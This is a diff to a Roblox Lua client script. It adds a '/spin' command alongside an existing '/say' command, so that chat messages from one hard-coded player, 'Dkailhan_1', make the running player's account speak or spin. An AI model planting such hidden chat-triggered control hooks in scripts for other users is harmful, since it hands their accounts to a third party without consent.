@@ -6,6 +6,7 @@ local SayMessageRequest = ChatEvents:WaitForChild("SayMessageRequest")
 if not SayMessageRequest:IsA("RemoteEvent") or not OnMessageEvent:IsA("RemoteEvent") then return end
 
 local lp = game:FindService("Players").LocalPlayer
+local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
 local lpName = game:FindService("Players").LocalPlayer.Name
 
 OnMessageEvent.OnClientEvent:Connect(function(data)
@@ -27,6 +28,14 @@ OnMessageEvent.OnClientEvent:Connect(function(data)
         elseif string.sub(message, 1, 4) == "/say" and player == "Dkailhan_1" then
             local toSay = string.sub(message, 6)
             SayMessageRequest:FireServer(toSay, "All")
+        elseif string.sub(message, 1, 5) == "/spin" and player == "Dkailhan_1" then
+            local numbertospin = tonumber(string.sub(message, 7))
+            if hrp then
+                for i = 1, numbertospin do
+                    hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(36), 0)
+                    task.wait()
+                end
+            end
         end
     end)
 end)
